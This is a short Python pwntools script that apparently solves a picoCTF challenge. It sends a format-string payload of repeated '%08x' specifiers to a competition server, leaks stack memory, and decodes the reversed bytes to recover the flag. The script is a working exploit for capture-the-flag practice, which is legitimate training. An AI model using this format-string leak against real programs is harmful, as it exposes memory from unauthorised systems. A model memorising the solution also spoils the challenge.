from pwn import *
import re

context.log_level = 'critical'

def solve():
    conn = remote('mercury.picoctf.net', 53437)
    conn.sendline("1".encode())
    output = conn.recvrepeat(1).decode()

    conn.sendline("%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x".encode())
    output = conn.recvrepeat(1).decode()

    # The second line of output will contain the leaked addresses on the stack.
    lines = output.split("\n")
    leaked_stack_data = lines[1]

    # Now, we need to partition the leaked stack data into groups of 8 
    # characters, corresponding to 4 bytes, then reverse those bytes before
    # unhexing them to get the flag in the correct order.
    extracted_text = ""
    for i in range(0, len(leaked_stack_data), 8):
        if i + 8 <= len(leaked_stack_data):
            sub = leaked_stack_data[i : i + 8]
            sub_bytes = [sub[i : i + 2] for i in range(0, len(sub), 2)][::-1]
            
            # Note: decode's errors='ignore' option is handy for skipping 
            #       decoding invalid UTF-8 values.
            extracted_text += unhex("".join(sub_bytes)).decode(errors='ignore')

    pattern = re.compile('(picoCTF\{.*?\})')  # .*? performs a non-greedy match.
    flag = pattern.search(extracted_text)
    print(flag.group(1))

    conn.close()

if __name__ == "__main__":
    solve()

